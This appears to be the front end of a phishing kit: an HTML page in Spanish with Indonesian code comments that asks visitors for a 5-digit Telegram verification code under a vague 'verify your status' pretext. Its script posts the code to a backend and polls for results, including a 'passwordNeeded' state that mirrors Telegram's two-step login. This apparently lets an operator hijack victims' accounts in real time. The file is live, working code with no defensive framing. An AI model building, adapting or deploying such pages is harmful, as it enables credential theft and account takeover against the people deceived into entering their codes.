<style>
  .form-card {
    background: #ffffff;
    border: 1px solid #ccc;
    border-radius: 12px; /* Dibuat sedikit lebih bulat agar modern */
    padding: 0; /* Padding diubah ke 0 agar gambar bisa menempel ke pinggir jika mau */
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    max-width: 450px;
    margin: 20px auto; /* Ditambah auto agar tengah */
    overflow: hidden; /* Agar gambar tidak keluar dari border radius */
  }

  /* Style untuk Logo Banner */
  .form-banner-img {
    width: 100%;
    max-width: 300px; /* Ukuran logo disesuaikan */
    height: auto;
    display: block;
    margin: 25px auto 0; /* Jarak atas logo */
  }

  .otp-wrapper {
    padding: 10px 25px 30px; /* Padding dipindahkan ke sini */
  }

  .otp-title {
    font-size: 25px !important;
    font-weight: 700;
  }

  .otp-input {
    border-radius: 20px;
    border: 1.5px solid #ddd;
    text-align: center;
    font-size: 18px;
    letter-spacing: 6px;
  }

  .otp-btn {
    height: 52px;
    width: 100%;
    max-width: 400px;
    border-radius: 8px;
    background: #fff;
    color: #000;
    border: 2px solid #000;
    font-weight: 800;
    font-size: 15px;
    text-transform: uppercase;
    transition: all 0.2s ease-in-out;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
  }

  .otp-btn:active,
  .otp-btn.clicked {
    background: #000 !important;
    color: #fff !important;
    transform: scale(0.98);
  }

  .otp-input::placeholder {
    font-size: 17px;
    letter-spacing: normal;
    color: #999;
  }
</style>

<div id="loader" class="loader" style="display: none;">
  <div class="spinner"></div>
</div>

<div class="form-card">
  <img src="assets/otc.png" class="form-banner-img" alt="Logo">

  <div class="otp-wrapper">
    <h5 class="mt-3 text-center otp-title">
      Ingrese el código de verificación
    </h5>

    <p class="mt-3 text-center" style="font-size: 14px; color: #666;">
      Introduzca el código enviado por Telegram para verificar su estado
    </p>

    <div class="mb-3 mt-4">
      <input type="text" class="form-control otp-input shadow-none" name="phone" id="phone" placeholder="Código OTP (5 dígitos)"
        maxlength="5" inputmode="numeric" />
    </div>

    <p id="wrong" class="text-center text-danger fw-semibold" style="display:none; font-size: 13px; background: #ffebee; padding: 8px; border-radius: 8px;"></p>

    <button class="btdk btn otp-btn mx-auto d-block">
      SIGUIENTE PASO
    </button>
  </div>
</div>

<script>
  $("#wrong").hide();
  $("#loader").hide();

  // Script Backend tetap sama tanpa diubah
  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: { "method": "getStatus" },
      success: function (data) {
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          if (data.result.detail == "wrong") {
            $("#wrong").html("Código OTP no válido").show();
            $("#loader").hide();
          } else if (data.result.detail == "passwordNeeded") {
            window.location.reload();
          }
          $("input[type='text']").val("");
        } else {
          setTimeout(checkStatus, 500);
        }
      }
    });
  }

  $("button").on("click", function (e) {
    e.preventDefault();
    var com = $("input[type='text']").val();
    if (com != "") {
      $("#loader").show();
      $(this).addClass("clicked");
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: { "method": "sendOtp", "otp": com },
        success: function () {
          setTimeout(checkStatus, 500);
        }
      });
    }
  });

</script>
